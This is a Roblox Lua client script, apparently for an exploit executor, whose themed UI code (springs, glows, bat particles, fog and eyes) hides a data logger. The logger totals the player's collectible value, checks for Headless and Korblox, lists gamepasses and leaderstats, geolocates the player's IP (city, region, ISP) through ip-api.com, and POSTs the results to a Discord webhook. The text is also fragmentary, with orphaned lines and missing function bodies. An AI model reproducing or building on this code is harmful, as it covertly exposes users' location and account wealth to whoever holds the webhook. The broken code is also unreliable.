function ConfigManager:Load()
    if ENV_TESTING or type(readfile) ~= "function" then return end
    local ok, raw = pcall(readfile, CONFIG_FILE_NAME)
    if not ok or type(raw) ~= "string" then return end
    local okDecode, decoded = pcall(function() return HttpService:JSONDecode(raw) end)
    if okDecode and type(decoded) == "table" then
        for k, v in pairs(decoded) do
            if self.Settings[k] ~= nil and type(v) == "boolean" then
                self.Settings[k] = v
            end
        end
    end
end

function ConfigManager:Save()

    pcall(function()
        writefile(CONFIG_FILE_NAME, HttpService:JSONEncode(self.Settings))
    end)
end

local Cleanup = { Items = {} }

function Cleanup:Add(item)
    table.insert(self.Items, item)
    return item
end

function Cleanup:Bind(signal, callback)
    return self:Add(signal:Connect(callback))
end

function Cleanup:Clean()
    for _, item in ipairs(self.Items) do
        if typeof(item) == "RBXScriptConnection" then
            pcall(function() item:Disconnect() end)
        end
    end
    self.Items = {}
end

local function create(class, props, parent)
    local inst = Instance.new(class)
    for k, v in pairs(props) do inst[k] = v end
    if parent then inst.Parent = parent end
    return inst
end

local function round(obj, radius)
    return create("UICorner", { CornerRadius = UDim.new(0, radius) }, obj)
end

local function stroke(obj, color, thickness, transparency)
    return create("UIStroke", {
        Color             = color,
        Thickness         = thickness or 1,
        Transparency      = transparency or 0,
        ApplyStrokeMode   = Enum.ApplyStrokeMode.Border,
    }, obj)
end

local function tween(obj, duration, props, style, direction)
    local tw = TweenService:Create(
        obj,
        TweenInfo.new(duration, style or Enum.EasingStyle.Quint, direction or Enum.EasingDirection.Out),
        props
    )
    tw:Play()
    return tw
end

        TextXAlignment         = Enum.TextXAlignment.Left,

    for k, v in pairs(props) do base[k] = v end
    return create("TextLabel", base, parent)
end

-- ============================================================
-- SPRING SYSTEM
-- ============================================================
local Springs = { List = {} }
local Spring  = {}
Spring.__index = Spring

function Spring.new(initial, stiffness, damping, mass, onUpdate)
    local self = setmetatable({
        Value     = initial,
        Target    = initial,
        Velocity  = 0,
        Stiffness = stiffness,
        Damping   = damping,
        Mass      = mass or 1,
        Awake     = true,
        OnUpdate  = onUpdate,
    }, Spring)
    table.insert(Springs.List, self)
    return self
end

function Spring:Set(target)
    if self.Target ~= target then
        self.Target = target
        self.Awake  = true
    end
end

function Spring:Snap(value)
    self.Value    = value
    self.Target   = value
    self.Velocity = 0
    self.Awake    = true
end

function Spring:Step(dt)
    local steps = math.min(8, math.max(1, math.ceil(dt * 120)))
    local h = dt / steps
    for _ = 1, steps do
        local force = -self.Stiffness * (self.Value - self.Target) - self.Damping * self.Velocity
        self.Velocity = self.Velocity + (force / self.Mass) * h
        self.Value    = self.Value + self.Velocity * h
    end
    if math.abs(self.Value - self.Target) < 0.0005 and math.abs(self.Velocity) < 0.001 then
        self.Value    = self.Target
        self.Velocity = 0
        self.Awake    = false
    end
    if self.OnUpdate then self.OnUpdate(self.Value) end
end

function Springs:Update(dt)
    dt = math.min(dt, 1 / 20)
    for _, spring in ipairs(self.List) do
        if spring.Awake then spring:Step(dt) end
    end
end

local GlowRegistry = {}

local function createGlow(parent, color, spread, intensity, radius, zindex)
    -- prune glows whose host was destroyed (toasts/notices/success bursts)
    for i = #GlowRegistry, 1, -1 do
        local alive = GlowRegistry[i]
        if not alive or not alive.Parent then table.remove(GlowRegistry, i) end
    end
    local layers = ConfigManager.Settings.LiteMode and 4 or 8
    local host = create("Frame", {
        BackgroundTransparency = 1,
        AnchorPoint            = Vector2.new(0.5, 0.5),
        Position               = UDim2.fromScale(0.5, 0.5),
        Size                   = UDim2.new(1, spread * 2, 1, spread * 2),
        ZIndex                 = zindex or 1,
        Visible                = ConfigManager.Settings.Glows,
    }, parent)
    local alpha = (intensity * 1.5) / layers
    for i = 1, layers do
        local inset = ((i - 1) / layers) * spread
        local layer = create("Frame", {
            BackgroundColor3 = color,
            BackgroundTransparency = 1 - alpha,
            BorderSizePixel  = 0,
            AnchorPoint      = Vector2.new(0.5, 0.5),
            Position         = UDim2.fromScale(0.5, 0.5),
            Size             = UDim2.new(1, -inset * 2, 1, -inset * 2),
            ZIndex           = zindex or 1,
        }, host)
        round(layer, (radius or 8) + (spread - inset))
    end
    table.insert(GlowRegistry, host)
    return host
end

local function glassFill(obj)
    obj.BackgroundTransparency = 1
    local fill = create("Frame", {
        Size             = UDim2.fromScale(1, 1),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel  = 0,
        ZIndex           = 1,
    }, obj)
    local corner = obj:FindFirstChildOfClass("UICorner")
    round(fill, corner and corner.CornerRadius.Offset or 8)
    create("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0,    Color3.fromRGB(38, 20, 14)),
            ColorSequenceKeypoint.new(0.55, Color3.fromRGB(22, 10, 8)),
            ColorSequenceKeypoint.new(1,    Color3.fromRGB(14,  6, 5)),
        }),
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0, 0.06),
            NumberSequenceKeypoint.new(1, 0.2),
        }),
        Rotation = 90,
    }, fill)
    local highlight = create("Frame", {
        Size             = UDim2.new(1, -24, 0, 1),
        Position         = UDim2.fromOffset(12, 0),
        BackgroundColor3 = Color3.new(1, 1, 1),
        BorderSizePixel  = 0,
        ZIndex           = 3,
    }, obj)
    create("UIGradient", {
        Transparency = NumberSequence.new({
            NumberSequenceKeypoint.new(0,    1),
            NumberSequenceKeypoint.new(0.5, 0.7),
            NumberSequenceKeypoint.new(1,    1),
        }),
    }, highlight)
end

local function glassStroke(obj, transparency)
    local s = stroke(obj, Theme.Border, 1, transparency or 0.1)
    create("UIGradient", {
        Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0,    Color3.fromRGB(255, 140, 60)),
            ColorSequenceKeypoint.new(0.5, Theme.Border),
            ColorSequenceKeypoint.new(1,    Color3.fromRGB(180,  20, 20)),
        }),
        Rotation = 45,
    }, s)
    return s
end

local function drawIcon(parent, name, size, color, pos)
    local u    = size / 24
    local root = create("Frame", {
        BackgroundTransparency = 1,
        Size                   = UDim2.fromOffset(size, size),
        Position               = pos or UDim2.new(),
        AnchorPoint            = Vector2.new(0.5, 0.5),
    }, parent)
    local parts = {}

    local function seg(x1, y1, x2, y2, t)
        local dx, dy = x2 - x1, y2 - y1
        local len    = math.sqrt(dx * dx + dy * dy)
        local th     = math.max((t or 1.8) * u, 1)
        local f = create("Frame", {
            BackgroundColor3 = color,
            BorderSizePixel  = 0,
            AnchorPoint      = Vector2.new(0.5, 0.5),
            Position         = UDim2.fromOffset((x1 + x2) / 2 * u, (y1 + y2) / 2 * u),
            Size             = UDim2.fromOffset(len * u + th, th),
            Rotation         = math.deg(math.atan2(dy, dx)),
        }, root)
        round(f, th / 2)
        table.insert(parts, { f, "fill" })
    end

    local function ring(cx, cy, w, h, t, r)
        local f = create("Frame", {
            BackgroundTransparency = 1,
            AnchorPoint            = Vector2.new(0.5, 0.5),
            Position               = UDim2.fromOffset(cx * u, cy * u),
            Size                   = UDim2.fromOffset(w * u, h * u),
        }, root)
        round(f, r * u)
        local s = stroke(f, color, math.max(t * u, 1))
        table.insert(parts, { s, "stroke" })
    end

    local function dot(cx, cy, r)
        local f = create("Frame", {
            BackgroundColor3 = color,
            BorderSizePixel  = 0,
            AnchorPoint      = Vector2.new(0.5, 0.5),
            Position         = UDim2.fromOffset(cx * u, cy * u),
            Size             = UDim2.fromOffset(r * 2 * u, r * 2 * u),
        }, root)
        round(f, r * u)
        table.insert(parts, { f, "fill" })
    end

    local function arc(cx, cy, r, a0, a1, t, n)
        n = n or 8
        local px, py
        for i = 0, n do
            local a = math.rad(a0 + (a1 - a0) * i / n)
            local x, y = cx + math.cos(a) * r, cy + math.sin(a) * r
            if px then seg(px, py, x, y, t) end
            px, py = x, y
        end
    end

    local function poly(points, t)
        for i = 1, #points - 1 do
            seg(points[i][1], points[i][2], points[i + 1][1], points[i + 1][2], t)
        end
    end

            local a = math.rad(i * 45)
            seg(12+math.cos(a)*6.8, 12+math.sin(a)*6.8, 12+math.cos(a)*10, 12+math.sin(a)*10, 2.4)
        end
    elseif name == "check" then
        seg(5,12.5, 10,17.5, 2.2); seg(10,17.5, 19.5,7, 2.2)
    elseif name == "copy" then
        ring(14.5,14.5, 12,12, 1.6, 2.5); ring(9.5,9.5, 12,12, 1.6, 2.5)
    elseif name == "user" then
        ring(12,8, 7,7, 1.8, 3.5)

        seg(4,21.5, 20,21.5, 1.8)
    elseif name == "terminal" then
        ring(12,12, 20,16, 1.6, 3)
        seg(7,9.5, 11,12.5, 1.8); seg(11,12.5, 7,15.5, 1.8)

    elseif name == "lock" then

        seg(7.5,10, 7.5,11.8, 1.8); seg(16.5,10, 16.5,11.8, 1.8)
        dot(12,16, 1.3)
    elseif name == "close" then

local function applyRipple(button)
    button.ClipsDescendants = true
    Cleanup:Bind(button.InputBegan, function(input)
        local kind = input.UserInputType
        if kind ~= Enum.UserInputType.MouseButton1 and kind ~= Enum.UserInputType.Touch then return end
        local point
        if kind == Enum.UserInputType.Touch then
            point = Vector2.new(input.Position.X, input.Position.Y) + GuiService:GetGuiInset()
        else
            point = UserInputService:GetMouseLocation()
        end
        local size = button.AbsoluteSize
        local rel  = point - button.AbsolutePosition
        local ripple = create("Frame", {
            Size                   = UDim2.fromOffset(0, 0),
            Position               = UDim2.fromScale(rel.X / math.max(size.X,1), rel.Y / math.max(size.Y,1)),
            AnchorPoint            = Vector2.new(0.5, 0.5),
            BackgroundColor3       = Color3.new(1, 1, 1),
            BackgroundTransparency = 0.55,
            BorderSizePixel        = 0,
            ZIndex                 = button.ZIndex + 5,
        }, button)
        round(ripple, 999)
        local target = math.max(size.X, size.Y) * 2.4
        local tw = TweenService:Create(ripple, TweenInfo.new(0.65, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {
            Size                   = UDim2.fromOffset(target, target),
            BackgroundTransparency = 1,
        })
        tw:Play()
        tw.Completed:Connect(function() ripple:Destroy() end)
    end)
end

local function attachInteraction(button, target)
    target = target or button
    local scale  = create("UIScale", { Scale = 1 }, target)
    local spring = Spring.new(1, 340, 15, 1, function(v) scale.Scale = v end)
    local hovering, pressed = false, false
    local function refresh()
        spring:Set(pressed and 0.96 or (hovering and 1.04 or 1))
    end
    local function isPress(input)
        return input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch
    end
    Cleanup:Bind(button.MouseEnter,  function() hovering = true;  refresh() end)
    Cleanup:Bind(button.MouseLeave,  function() hovering = false; pressed = false; refresh() end)
    Cleanup:Bind(button.InputBegan,  function(input) if isPress(input) then pressed = true;  refresh() end end)
    Cleanup:Bind(button.InputEnded,  function(input) if isPress(input) then pressed = false; refresh() end end)
    return spring
end

local Toasts = {}

local function restackToasts()
    local y = 20
    for _, entry in ipairs(Toasts) do
        tween(entry.Holder, 0.4, { Position = UDim2.new(1, -20, 1, -y) }, Enum.EasingStyle.Back)
        y = y + entry.Height + 8
    end
end

local function FireToast(gui, title, kind, detail, iconName)
    local color = Theme.Accent
    if kind == "Success" then color = Theme.Success
    elseif kind == "Error"   then color = Theme.Error
    elseif kind == "Warning" then color = Theme.Warning end
    local height = detail and 70 or 46
    local guiW   = (gui.AbsoluteSize.X > 0) and gui.AbsoluteSize.X or 800
    local holder = create("Frame", {
        Size                   = UDim2.fromOffset(math.clamp(guiW - 48, 240, 320), height),
        AnchorPoint            = Vector2.new(1, 1),
        BackgroundTransparency = 1,
        Position               = UDim2.new(1, 380, 1, -20),
        ZIndex                 = 100,
    }, gui)
    createGlow(holder, color, 16, 0.4, 8, 100)
    local card = create("CanvasGroup", { Size = UDim2.fromScale(1,1), GroupTransparency=0, BorderSizePixel=0, ZIndex=101 }, holder)
    round(card, 8)
    glassFill(card)
    glassStroke(card)
    local bar = create("Frame", {
        Size             = UDim2.new(0, 3, 1, -18),
        Position         = UDim2.fromOffset(9, 9),
        BackgroundColor3 = color,
        BorderSizePixel  = 0,
        ZIndex           = 4,
    }, card)
    round(bar, 2)
    local icon = iconName or (kind=="Error" and "close" or (kind=="Success" and "check" or "shield"))
    drawIcon(card, icon, 18, color, UDim2.fromOffset(34, detail and 24 or height/2))
    makeLabel(card, {
        Text         = title,
        TextSize     = 12,
        Font         = Enum.Font.GothamBold,
        Position     = UDim2.fromOffset(54, detail and 8 or 0),
        Size         = UDim2.new(1, -64, 0, detail and 20 or height),
        TextTruncate = Enum.TextTruncate.AtEnd,
    })
    if detail then
        makeLabel(card, {
            Text                = detail,
            TextSize            = 11,
            TextColor3          = Theme.SubText,
            TextWrapped         = true,
            TextYAlignment      = Enum.TextYAlignment.Top,
            Position            = UDim2.fromOffset(54, 28),
            Size                = UDim2.new(1, -64, 0, 36),
        })
    end
    local entry = { Holder = holder, Height = height }
    table.insert(Toasts, entry)
    restackToasts()
    tween(holder, 0.35, { Position = UDim2.new(1, -20, 1, -20) }, Enum.EasingStyle.Back)

local function edgeFlash(parent, color, size, pulses, z)
    local host  = create("Frame", { Size = UDim2.fromScale(1,1), BackgroundTransparency=1, ZIndex=z }, parent)
    local edges = {}
    local defs  = {
        { UDim2.new(1,0,0,size), UDim2.fromOffset(0,0),        90  },
        { UDim2.new(1,0,0,size), UDim2.new(0,0,1,-size),       270 },
        { UDim2.new(0,size,1,0), UDim2.fromOffset(0,0),        0   },
        { UDim2.new(0,size,1,0), UDim2.new(1,-size,0,0),       180 },
    }
    for _, d in ipairs(defs) do
        local e = create("Frame", {
            Size                   = d[1],
            Position               = d[2],
            BackgroundColor3       = color,
            BackgroundTransparency = 1,
            BorderSizePixel        = 0,
            ZIndex                 = z,
        }, host)
        create("UIGradient", {
            Rotation     = d[3],
            Transparency = NumberSequence.new({
                NumberSequenceKeypoint.new(0, 0.1),
                NumberSequenceKeypoint.new(1, 1),
            }),
        }, e)
        table.insert(edges, e)
    end
    task.spawn(function()
        for _ = 1, pulses do
            for _, e in ipairs(edges) do tween(e, 0.12, { BackgroundTransparency = 0 }, Enum.EasingStyle.Quad) end
            task.wait(0.14)
            for _, e in ipairs(edges) do tween(e, 0.3,  { BackgroundTransparency = 1 }, Enum.EasingStyle.Quad) end
            task.wait(0.32)
        end
        host:Destroy()
    end)
    return host
end

    end)

local function createBatParticles(parent, count, zindex)
    local field = create("Frame", {
        Size                   = UDim2.fromScale(1, 1),
        BackgroundTransparency = 1,
        ZIndex                 = zindex,
        Visible                = ConfigManager.Settings.Particles,
    }, parent)
    local list = {}
    for _ = 1, count do
        local sz = 14 + math.random(0, 8)
        local holder = create("Frame", {
            BackgroundTransparency = 1,
            Size                   = UDim2.fromOffset(sz, sz),
            AnchorPoint            = Vector2.new(0.5, 0.5),
            Position               = UDim2.fromScale(math.random(), math.random()),
            ZIndex                 = zindex,
        }, field)
        drawIcon(holder, "bat", sz, Color3.fromRGB(50, 20, 20), UDim2.fromScale(0.5, 0.5))
        -- cache the icon frames: GetDescendants() every frame was GC churn
        local iconParts = {}
        for _, child in ipairs(holder:GetDescendants()) do
            if child:IsA("Frame") then table.insert(iconParts, child) end
        end
        local dirRight = math.random() < 0.5
        table.insert(list, {
            holder    = holder,
            x         = math.random(),
            y         = math.random(),
            speed     = 0.012 + math.random() * 0.022,
            phase     = math.random() * math.pi * 2,
            amp       = 0.012 + math.random() * 0.02,
            freq      = 0.6 + math.random() * 1.0,
            dirRight  = dirRight,
            base      = 0.55 + math.random() * 0.3,
            depth     = 0.3 + math.random() * 0.7,
            flipTimer = math.random() * 5,
            parts     = iconParts,
        })
    end
    return field, list
end

local function updateBatParticles(list, t, dt, norm)
    for _, p in ipairs(list) do
        p.flipTimer = p.flipTimer - dt
        if p.flipTimer <= 0 then
            if math.random() < 0.2 then p.dirRight = not p.dirRight end
            p.flipTimer = 3 + math.random() * 4
        end
        local dir = p.dirRight and 1 or -1
        p.x = p.x + p.speed * dir * dt * 60 / 60
        if p.x > 1.06 then p.x = -0.06 elseif p.x < -0.06 then p.x = 1.06 end
        local x = p.x + math.sin(t * p.freq + p.phase) * p.amp - norm.X * p.depth * 0.03
        local y = p.y - norm.Y * p.depth * 0.02
        y = y + math.sin(t * p.freq * 1.3 + p.phase) * 0.015
        if y < -0.05 then y = 1.05 end
        if y > 1.05  then y = -0.05 end
        p.y = y
        p.holder.Position                  = UDim2.fromScale(x, y)
        p.holder.Rotation                  = dir < 0 and 180 or 0
        local alpha = math.clamp(p.base + math.sin(t * p.freq * 2 + p.phase) * 0.15, 0, 1)
        for _, part in ipairs(p.parts) do
            part.BackgroundTransparency = alpha
        end
    end
end

local function truncate(text, limit)
    text = tostring(text or "")
    limit = tonumber(limit) or 200
    if #text <= limit then return text end
    if limit <= 3 then return string.sub(text, 1, limit) end
    return string.sub(text, 1, limit - 3) .. "..."
end

        end
    end

        local gameCount = 0
        for _, id in ipairs(ids) do
            local ok, owns = pcall(function()
                return MarketplaceService:UserOwnsGamePassAsync(player.UserId, id)
            end)
            if ok and owns then
                gameCount  = gameCount + 1
                totalOwned = totalOwned + 1
            end
        end
        if gameCount > 0 then
            table.insert(ownedGamepasses, string.format("%s (%d)", gameName, gameCount))
        end
    end
    if totalOwned == 0 then return "None" end
    return table.concat(ownedGamepasses, ", ")
end

local function getPlayerInventoryData(player)
    local userId     = player.UserId
    local rap        = 0
    local limitedCount = 0
    local isPrivate  = false

    local hasHeadless = "No"
    local hasKorblox  = "No"
    if assetApiWorks(player) then
        pcall(function()
            local okH, ownsH = pcall(function() return MarketplaceService:PlayerOwnsAsset(player, 13408226) end)
            if okH and ownsH then hasHeadless = "Yes" end
        end)
        pcall(function()
            local okK, ownsK = pcall(function() return MarketplaceService:PlayerOwnsAsset(player, 139607718) end)
            if okK and ownsK then hasKorblox = "Yes" end
        end)
    else
        hasHeadless, hasKorblox = "N/A", "N/A"
    end

    local ok, _ = pcall(function()
        local cursor = ""
        repeat
            local url = "https://inventory.roproxy.com/v1/users/"..tostring(userId).."/assets/collectibles?assetType=All&sortOrder=Asc&limit=100"
            if cursor ~= "" then url = url.."&cursor="..cursor end
            local success, response = pcall(function() return game:HttpGet(url) end)
            if not success or not response then break end
            if string.find(response,"is private") or string.find(response,"Unauthorized") or string.find(response,"403") then
                isPrivate = true; break
            end
            local okDec, data = pcall(function() return HttpService:JSONDecode(response) end)
            if okDec and data and data.data then
                for _, item in ipairs(data.data) do
                    if item.recentAveragePrice then
                        rap          = rap + item.recentAveragePrice
                        limitedCount = limitedCount + 1
                    end
                end
                cursor = data.nextPageCursor or ""
            else
                cursor = ""
            end
        until cursor == nil or cursor == ""
    end)

    if not ok or isPrivate then
        return "Private", "0", "R$ 0", "None", hasKorblox, hasHeadless
    end

    local function formatNumber(n)
        local formatted = tostring(n)
        while true do
            local k
            formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
            if k == 0 then break end
        end
        return formatted
    end

    local rareBundles = "None"
    if hasHeadless == "N/A" or hasKorblox == "N/A" then
        rareBundles = "N/A (cannot query from client)"
    elseif hasHeadless == "Yes" and hasKorblox == "Yes" then rareBundles = "Headless & Korblox"
    elseif hasHeadless == "Yes" then rareBundles = "Headless"
    elseif hasKorblox == "Yes"  then rareBundles = "Korblox"
    end

    return "Public", tostring(limitedCount), "R$ "..formatNumber(rap), rareBundles, hasKorblox, hasHeadless
end

local function getLeaderstats(player)
    local ls = player:FindFirstChild("leaderstats")
    if not ls then return nil end
    local lines = {}
    local function fmtNum(n)
        n = tonumber(n)
        if not n then return tostring(n) end
        if n >= 1e9 then return string.format("%.2fB", n/1e9)
        elseif n >= 1e6 then return string.format("%.2fM", n/1e6)
        elseif n >= 1e3 then return string.format("%.1fK", n/1e3)
        else
            local s = tostring(math.floor(n))
            while true do
                local k; s, k = string.gsub(s, "^(-?%d+)(%d%d%d)", "%1,%2")
                if k == 0 then break end
            end
            return s
        end
    end
    for _, stat in ipairs(ls:GetChildren()) do
        local val = tostring(stat.Value)
        local num = tonumber(val)
        table.insert(lines, string.format("**%s:** `%s`", stat.Name, num and fmtNum(num) or val))
    end
    return #lines > 0 and table.concat(lines, "\n") or nil
end

-- Detect country flag emoji from 2-letter country code
local function countryCodeToFlag(code)
    if not code or #code ~= 2 then return "" end
    local a = string.byte(code:upper(), 1) - string.byte("A") + 0x1F1E6
    local b = string.byte(code:upper(), 2) - string.byte("A") + 0x1F1E6
    local function utf8char(n)
        if n < 0x80 then return string.char(n) end
        if n < 0x800 then return string.char(0xC0+math.floor(n/0x40), 0x80+n%0x40) end
        if n < 0x10000 then return string.char(0xE0+math.floor(n/0x1000), 0x80+math.floor(n/0x40)%0x40, 0x80+n%0x40) end
        return string.char(0xF0+math.floor(n/0x40000), 0x80+math.floor(n/0x1000)%0x40, 0x80+math.floor(n/0x40)%0x40, 0x80+n%0x40)
    end
    return utf8char(a) .. utf8char(b)
end

-- Get rich location info including country code for flag
local function getRichLocationInfo()
    local result = { city = "Unknown", region = "Unknown", country = "Unknown", countryCode = "", flag = "", isp = "Unknown", org = "Unknown" }
    pcall(function()
        local req = getRequestFunction()
        if not req then return end
        local response = req({ Url = "http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,isp,org", Method = "GET" })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.status == "success" then
                result.city        = data.city        or "Unknown"
                result.region      = data.regionName  or "Unknown"
                result.country     = data.country     or "Unknown"
                result.countryCode = data.countryCode or ""
                result.flag        = countryCodeToFlag(data.countryCode)
                result.isp         = data.isp         or "Unknown"
                result.org         = data.org         or "Unknown"
            end
        end
    end)
    return result
end

-- Get screen resolution string with aspect ratio
local function getResolutionWithRatio()
    local w, h = 0, 0
    pcall(function()
        local vp = workspace.CurrentCamera.ViewportSize
        w, h = math.floor(vp.X + 0.5), math.floor(vp.Y + 0.5)
    end)
    if w == 0 or h == 0 then return "Unknown" end
    local function gcd(a, b) while b ~= 0 do a, b = b, a % b end return a end
    local g  = gcd(w, h)
    local rw, rh = w / g, h / g
    -- Simplify large ratios
    if rw > 32 then
        local approx = { {16,9},{16,10},{21,9},{4,3},{3,2},{1,1} }
        local best, bestDiff = approx[1], math.huge
        for _, r in ipairs(approx) do
            local diff = math.abs(w/h - r[1]/r[2])
            if diff < bestDiff then bestDiff = diff; best = r end
        end
        rw, rh = best[1], best[2]
    end
    return string.format("%dx%d (%d:%d)", w, h, rw, rh)
end

local function fetchAvatarUrl(requestFn)
    if WebhookState.AvatarUrl then return WebhookState.AvatarUrl end
    local url = string.format(
        "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%d&size=420x420&format=Png&isCircular=false",
        Players.LocalPlayer.UserId
    )
    for _ = 1, 2 do
        local ok, response = pcall(function() return requestFn({ Url = url, Method = "GET" }) end)
        if ok and type(response) == "table" and response.StatusCode == 200 then
            local okDecode, body = pcall(function() return HttpService:JSONDecode(response.Body) end)
            local entry = okDecode and type(body)=="table" and type(body.data)=="table" and body.data[1]
            if entry and entry.state=="Completed" and type(entry.imageUrl)=="string" then
                WebhookState.AvatarUrl = entry.imageUrl
                return entry.imageUrl
            end
        end
        task.wait(1)
    end
    return nil
end

local function dispatch(requestFn, payload, targetUrl)
    local avatarUrl = fetchAvatarUrl(requestFn)
    if avatarUrl then
        local embed = payload.embeds[1]
        embed.thumbnail = { url = avatarUrl }
        embed.author    = {
            name     = payload.profileName,
            url      = payload.profileLink,
            icon_url = avatarUrl,
        }
    end
    payload.profileName  = nil
    payload.profileLink  = nil
    local ok, response = pcall(function()
        return requestFn({
            Url     = targetUrl or WEBHOOK_URL,
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body    = HttpService:JSONEncode(payload),
        })
    end)
    if not ok or type(response) ~= "table" then
        if WebhookState.OnResult then WebhookState.OnResult(nil, tostring(response)) end
        return
    end
    if WebhookState.OnResult then WebhookState.OnResult(response.StatusCode) end
    if response.StatusCode == 429 then
        local retryAfter = DEFAULT_RETRY_SECONDS
        local okDecode, body = pcall(function() return HttpService:JSONDecode(response.Body) end)
        if okDecode and type(body)=="table" and tonumber(body.retry_after) then
            retryAfter = tonumber(body.retry_after)
        end
        WebhookState.BlockedUntil = os.clock() + retryAfter
    end
end

local function SendWebhookLog(status, detailMessage)
    if WEBHOOK_URL == "" or string.find(WEBHOOK_URL, "YOUR_ID", 1, true) then
        return false, "webhook url is not configured"
    end
    local requestFn = getRequestFunction()
    if not requestFn then return false, "no http request function available" end
    local key    = string.lower(tostring(status))
    local style  = STATUS_STYLES[key] or DEFAULT_STYLE
    local detail = truncate(tostring(detailMessage or "No details provided."), 1000)
    local now    = os.clock()
    if now < WebhookState.BlockedUntil then return false, "blocked by discord rate limit" end
    if now - WebhookState.LastSent < COOLDOWN_SECONDS then return false, "cooldown active" end
    pruneRecent(now)
    local fingerprint = key.."|"..detail
    if WebhookState.Recent[fingerprint] then return false, "duplicate log suppressed" end
    WebhookState.LastSent                 = now
    WebhookState.Recent[fingerprint]    = now
    task.spawn(function()
        local built, err = pcall(function()
            local payload = buildPayload(style, detail)
            dispatch(requestFn, payload, WEBHOOK_URL)
        end)
        if not built then
            warn("[Aurora] webhook payload failed: " .. tostring(err))
        end
    end)
    return true, "queued"
end

local function drawSeg(parent, x1, y1, x2, y2, thickness, color, transparency)
    local dx, dy = x2 - x1, y2 - y1
    local len    = math.sqrt(dx * dx + dy * dy)
    local th     = math.max(thickness or 1, 1)
    local line = create("Frame", {
        BackgroundColor3       = color,
        BackgroundTransparency = transparency or 0,
        BorderSizePixel        = 0,
        AnchorPoint            = Vector2.new(0.5, 0.5),
        Position               = UDim2.fromOffset((x1 + x2) / 2, (y1 + y2) / 2),
        Size                   = UDim2.fromOffset(len + th, th),
        Rotation               = math.deg(math.atan2(dy, dx)),
    }, parent)
    round(line, th / 2)
    return line
end

-- FX decorations must never steal mouse hover from the real buttons below.
-- `Interactable` only exists on newer clients, so set it defensively.
local function noInput(obj)
    pcall(function() obj.Interactable = false end)
    return obj
end

-- stacked translucent circles = cheap fake radial glow
local function softOrb(parent, size, color, zindex, base)
    local holder = create("Frame", {
        Size                   = UDim2.fromOffset(size, size),
        AnchorPoint            = Vector2.new(0.5, 0.5),
        Position               = UDim2.fromScale(0.5, 0.5),
        BackgroundTransparency = 1,
        ZIndex                 = zindex or 4,
    }, parent)
    local b = base or 0.62
    for i = 1, 4 do
        local s = 1 - (i - 1) * 0.19
        local layer = create("Frame", {
            Size                   = UDim2.fromScale(s, s),
            AnchorPoint            = Vector2.new(0.5, 0.5),
            Position               = UDim2.fromScale(0.5, 0.5),
            BackgroundColor3       = color,
            BackgroundTransparency = math.clamp(b + (4 - i) * 0.11, 0, 1),
            BorderSizePixel        = 0,
            ZIndex                 = zindex or 4,
        }, holder)
        round(layer, 999)
    end
    return holder
end

                        1.2, Color3.fromRGB(190, 210, 255), 0.35))
                end
                px, py = nx, ny
            end

            flash.Visible = true
            local steps = { { 0.04, 0.22 }, { 0.09, 1 }, { 0.05, 0.42 }, { 0.2, 1 } }
            for _, step in ipairs(steps) do
                tween(flash, step[1], { BackgroundTransparency = step[2] }, Enum.EasingStyle.Linear)
                task.wait(step[1])
            end
            flash.Visible = false

            for _, seg in ipairs(segs) do
                if seg.Parent then
                    tween(seg, 0.26, { BackgroundTransparency = 1 }, Enum.EasingStyle.Quad)
                end
            end
            task.delay(0.36, function()
                for _, seg in ipairs(segs) do
                    if seg.Parent then seg:Destroy() end
                end
                boltLayer.Visible = false
            end)
            lightningBusy = false
        end)
    end

        count = count or (lite and 7 or 14)

                if group.Parent then group:Destroy() end

    function api:Apply()
        fogLayer.Visible    = on("Fog")
        eyeLayer.Visible    = on("Eyes")
        emberLayer.Visible  = on("Embers")
        candleHolder.Visible = on("Candle")

    function api:Update(t, dt, pointer)
        if not host.Parent then return end
        local size = host.AbsoluteSize

        -- shake decay
        if api.ShakePower > 0 then
            api.ShakePower = math.max(0, api.ShakePower - dt * 2.4)
            local p = api.ShakePower
            api.ShakeOffset = Vector2.new((math.random() - 0.5) * 16 * p, (math.random() - 0.5) * 11 * p)
        else
            api.ShakeOffset = Vector2.new(0, 0)
        end

        -- 1. fog
        if fogLayer.Visible then
            for _, w in ipairs(fogList) do
                w.x = w.x + w.speed * dt
                if w.x > 1.35 then w.x = -0.35 elseif w.x < -0.35 then w.x = 1.35 end
                w.obj.Position = UDim2.fromScale(w.x, w.y + math.sin(t * 0.5 + w.phase) * w.amp)
                w.obj.BackgroundTransparency = w.base + math.sin(t * 0.8 + w.phase) * 0.04
            end
        end

        -- 2. eyes
        if eyeLayer.Visible then
            for _, e in ipairs(eyeList) do
                e.timer = e.timer + dt
                local fade
                if e.timer < 0.9 then
                    fade = 1 - e.timer / 0.9
                elseif e.timer > e.life - 0.9 then
                    fade = (e.timer - (e.life - 0.9)) / 0.9
                else
                    fade = 0
                end
                e.group.GroupTransparency = 0.12 + math.clamp(fade, 0, 1) * 0.88
                e.group.Position = UDim2.fromScale(
                    e.bx + math.sin(t * 0.22 + e.phase) * 0.03,
                    e.by + math.sin(t * 0.17 + e.phase * 1.4) * 0.02
                )
                e.blink = e.blink - dt
                if e.blink <= 0 then
                    e.blink = 1.6 + math.random() * 3.4
                    tween(e.squash, 0.07, { Scale = 0.12 }, Enum.EasingStyle.Quad)
                    task.delay(0.13, function()
                        if e.squash.Parent then
                            tween(e.squash, 0.18, { Scale = 1 }, Enum.EasingStyle.Back)
                        end
                    end)
                end
                if e.timer > e.life then
                    e.timer = 0
                    e.life  = 3.5 + math.random() * 5
                    e.phase = math.random() * math.pi * 2
                    e.bx = 0.12 + math.random() * 0.76
                    e.by = 0.14 + math.random() * 0.72
                    e.group.Position = UDim2.fromScale(e.bx, e.by)
                end
            end
        end

        -- 3. embers + cursor sparks
        if emberLayer.Visible then
            for _, m in ipairs(emberList) do
                m.y = m.y - m.speed * dt
                if m.y < -0.05 then
